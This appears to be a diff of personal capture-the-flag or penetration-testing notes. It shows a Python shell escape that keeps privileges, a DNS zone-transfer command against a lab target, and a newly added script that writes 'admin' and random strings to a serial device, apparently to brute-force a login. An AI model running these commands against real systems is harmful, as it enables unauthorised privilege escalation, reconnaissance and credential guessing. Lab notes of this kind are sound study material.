@@ -38,6 +38,25 @@ versions? updatedb searchsploit? google dorks xploits? ~? dns axfr @ip ?
 PYTHON ESCAPE SCRIPT
 import os; os.execl("/bin/sh", "sh", "-p")
 
+PYTHON 
+````
+import random
+import os
+import time
+
+L = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+while True:
+    os.system("echo 'admin' > /dev/ttyUSB0")
+    #time.sleep(5)
+    r = ""
+    for i in range(20):
+        r += random.choice(L)
+    os.system(f'echo {r} > /dev/ttyUSB0')
+    #time.sleep(5)
+    
+````
+
 DNS
 dig axfr @10.129.146.152 friendzone.red
 
